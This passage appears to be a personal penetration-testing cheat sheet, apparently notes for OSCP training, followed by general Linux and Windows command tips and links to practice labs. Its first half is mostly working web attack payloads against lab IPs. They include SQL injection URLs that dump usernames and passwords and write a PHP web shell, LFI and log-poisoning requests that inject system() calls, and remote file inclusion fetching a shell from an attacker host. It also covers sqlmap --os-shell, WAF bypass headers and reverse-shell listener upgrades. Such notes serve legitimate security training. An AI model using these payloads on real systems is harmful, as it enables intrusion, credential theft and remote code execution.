    - Extraction of usernames and passwords
    http://192.168.135.10/debug.php?id=2%20union%20all%20select%201,%20username,%20password%20from%20users
    - Read files
    http://192.168.135.10/debug.php?id=1 union all select 1, 2, load_file('C:/Windows/System32/drivers/etc/hosts')
    - Create a file and inject code for a backdoor
    http://192.168.135.10/debug.php?id=1 union all select 1, 2, "<?php echo shell_exec($_GET['cmd']);?>" into OUTFILE 'c:/xampp/htdocs/backdoor.php' 
    - Access backdoor
    http://192.168.135.10/backdoor.php?cmd=ipconfig

## nosql injection

## sqlmap
    - First perform a post request with burp suite(Which page to use is all depended on what exploit you find)
        - send to repeater, test post again to make sure it works
        - right click the request area, "copy to file", save as a .txt
        - Turn off proxy and intercept in burp!
    > sqlmap -r request2.txt --dbms mysql --os-shell


## PHP type juggling
    - Change post request in burp from
        username=admin&password=
    - To this
        username=admin&password[]=

## LFI vulns
    1) <?php $file = $_GET["file"]; include $file; ?>
    2) The above command is an example of getting information about a file
    
    - Null byte, bypass to view files
        > vuln.php?page=/etc/passwd%00
        > vuln.php?page=/etc/passwd%2500

## Log poisoning
    - First look for the phpinfo.php file, this can tell you where directory paths are
        - default path depends on server (look for php5.ini, or php.ini etc.)
    - Determine the distro, this will help to determine where apache and other 
      readable files are located
    - Need to find some type of input that allows for (found in ini.php)
        - allow_url_fopen (This is for LFI, and Log file poision)
        - allow_url_include (This with allow_rul_fopen enabled, will all for RFI)
    - The true test is to be able to read the URL, if you see something like this, you maybe able to fuzz for files
        - http://10.10.10.84/browse.php?file=
    - Enter a file path 
        - http://10.10.10.84/browse.php?file=/etc/passwd
        - Maybe try something with many backslashes
            - http://10.10.10.84/browse.php?file=../../../../../etc/passwd
    - Now start trying to find the web server type, and OS and determine where the apahce config file location is
        - This will show where log files are located, try to find the access.log or error.log
    - Send to burpsuite proxy, and to burpsuite repeater 
        - At this point you will need to adjust the user agent to inject a php web shell
            GET / HTTP/1.1
            Host: 10.10.10.84
            User-Agent: evil: <?php system($_GET['c']); ?>

            also try 

            GET / HTTP/1.1
            Host: 10.10.10.84
            User-Agent: <?php system($_GET['c']); ?>

        - Send the request (you will recieve a bad request which is good)
        - Now send a GET request to the specific log file with a command
            GET /browse.php?file=/var/log/httpd-access.log&c=pwd HTTP/1.1
            Host: 10.10.10.84
            User-Agent: evil: <?php system($_GET['c']); ?>

            also try

            GET /browse.php?file=/var/log/httpd-access.log&c=pwd HTTP/1.1
            Host: 10.10.10.84
            User-Agent: evil: <?php system($_GET['c']); ?>
            
        - If you check the output you should see "evil" and the command you sent. Now you have code execution
        - Use a php reverse shell for the command now to get control.
- 


## LFI Code execution:
    1) You can now execute reading a file and running the file as code, any command can now be run.
    2) "http://192.168.135.10/menu.php?file=c:\xampp\apache\logs\access.log&cmd=ipconfig"

## RFI Code xecution:
    1) Server must be configured in a specific way (allow_url_include set to “On”) [on by default on older versions]
    2) Create the filw in /var/www/html/evil.txt
        <?php echo '<pre>' . shell_exec($_GET['cmd']) . '</pre>'; ?>

    3) Change the 'cmd' to whatever you want
    4) sudo systemctl restart apache2
    5) http://192.168.135.10/menu.php?file=http://192.168.119.135/evil.txt&cmd=ipconfig
    6) You can find more web shells in /usr/share/webshells

    - Mount a webshell with null byte
    192.168.135.10/menu2.php?file=http://192.168.119.135/qsd-php-backdoor.php?

## Poison Null Bypte (Input validation)
    - Use this on a site that does not let you open files that are only a specific format.
    - The following will get past a site that only allows ".md" files.
    - Null Byte = %2500
        > http://192.168.1.106:3000/ftp/eastere.gg%2500.md

## Bypass WAF
    - You can possibly pass the "localhost" id to the server with "X-Forwarded-For: localhost" header
        > curl -i http://192.168.131.134:13337/logs?file=/etc/passwd -H "X-Forwarded-For: localhost";echo
        - If system is trying to snatize try the following 
        > curl -i http://192.168.131.134:13337/logs?file=/etc/passwd -H "X-Forwarded-For: localhost' or 1=1--";echo
    - Try other variations of x-forwarded-for
        - X-Host
        - X-Forwarded-Server
        - X-HTTP-Host-Override
        - Forwarded

# MISC Info:
------------
- Search a git repo for words in repo
    - You need to ad "/search?q=" at the end of the url
    - example:
        > https://github.com/openemr/openemr
            - Add "/search?q=" to the end with the word you want to search for 
        > https://github.com/openemr/openemr/search?q=version
            - Will search for the word "version" in the repo

# MISC linux commands:
----------------------
- Update databases
    - searchsploit
        > searchsploit -u
    - locate
        > sudo updatedb
        - search for all directories
            > locate -r '/[^\.]*$'
        - add a  directory
            > locate -r '/dirname$'
    - nmap nse scripts
        > sudo nmap --script-updatedb
- Run background jobs
    > some_cmd > some_file_output 2>&1 &
    - status
        > jobs
    - kill job 1
        > jobs %1
    - bring job 2 to foreground
        > fg 2
- interactive shell
    - Allow clear, and colors
        > export TERM=xterm-color
    - Start with rlwrap (Note: you cannot tab complete with stty)
        > rlwrap nc -nlvp 4444
    - Get access to bash
        > python -c 'import pty; pty.spawn("/bin/bash")'
        > python3 -c 'import pty; pty.spawn("/bin/bash")'
    - Allow tab complete, and fully interactive (MUST NOT USE "rlwrap")
        # METHOD 1
            - in victim
                > python -c 'import pty; pty.spawn("/bin/bash")'
                > CTRL-z
            - Now you are in kali
                > stty raw -echo
                > fg
            - back in victim
                > reset
                > vt100
                > export TERM=xterm-color
        # METHOD 2 (Not great with tmux)
            - In current NC session
                > CTRL+z
            - Now you are back in your local shell
                > stty raw -echo
                > fg
                > ENTER
            - Now you are back in the NC session
            - In another tmux window look up stty sessions
                > stty -a
                - Make note of "rows" value and "columns" value
            - Go back to the NC session
                > stty rows 9 columns 1
    - Change default shell
        > chsh --shell /bin/bash
        > SHELL=/bin/bash
        > setenv SHELL /bin/bash
- tree like commands
    - list all files recursivly
        > ls -lR
    - List all files recursivly 
        > find . -type f -not -path '*/\.*'
    - list but directories first
        > ls -l --group-directories-first
- xclip
    - copy all contents of a file to xclip
        > xclip -i job.b64 -selection clipboard
- Convert epoch time
    - date -d @1606778395

- clean up exploit that has "^M" characters in it
    > sed -i -e "s/^M//" filename.sh
    OR
    > vi filename.sh
    > :e +ff=unix
    - manually delete

- Decompress compression
    - tar.gz
        - compress
            > tar -zcvf newfiletocreate.tar.gz directory/
        - uncompress
            > tar -zxvf newfiletocreate.tar.gz
    - tar.bz2
        - uncompress
            > tar -xvf archive.tar.gz2
    - gz
        - uncompress
            > gzip -d file.gz
    - zip
        - unzip
            > unzip file.zip
    - tar.xz
        - uncompress
            > tar -xf newfiletocreate.tar.xz
    - rar
        - unrar
            > unrar e thefile.rar
- Run a command as another user
    - runas (need to be root)
        > runas -l username -c '/bin/bash'
    - sudo
        > sudo -u username /bin/bash
- seach apt database for packages
    > sudo apt update
    > sudo apt-cache search <string>

## Compile:
    - Compile C code on linux box
        > gcc -pthread code.c -o code -lcrypt
        > file code
        > chmod +x code
    - Compile C code into 32bit
        > gcc -m32 evil.c -o evil

## Windows Misc commands:

- Add to windows path variable


C:\Users\tony\Desktop>echo %PATH%
echo %PATH%
C:\Users\tony\AppData\Local\Microsoft\WindowsApps;

C:\Users\tony\Desktop>path C:\Users\tony\AppData\Local\Microsoft\WindowsApps;C:\Windows\system32
path C:\Users\tony\AppData\Local\Microsoft\WindowsApps;C:\Windows\system32

- Show windows version

Windows 10 (1903)       10.0.18362
Windows 10 (1809)       10.0.17763
Windows 10 (1803)       10.0.17134
Windows 10 (1709)       10.0.16299
Windows 10 (1703)       10.0.15063
Windows 10 (1607)       10.0.14393
Windows 10 (1511)       10.0.10586
Windows 10              10.0.10240

Windows 8.1 (Update 1)  6.3.9600
Windows 8.1             6.3.9200
Windows 8               6.2.9200

Windows 7 SP1           6.1.7601
Windows 7               6.1.7600

Windows Vista SP2       6.0.6002
Windows Vista SP1       6.0.6001
Windows Vista           6.0.6000

Windows XP2             5.1.26003

# Exploit exersies outside of OSCP lab:
--------------------------------------
## buffer overflow attacks:
    - dostackbufferoverflowgood
        - https://github.com/justinsteven/dostackbufferoverflowgood
    - brianpan
        - https://www.vulnhub.com/series/brainpan,32/

## Hack the box
    - https://www.hackthebox.eu/

## Vulnhub
    - https://www.vulnhub.com/
        - Nebula
        - Brainpan

## Exploit Exercises:
    - https://exploit-exercises.lains.space/



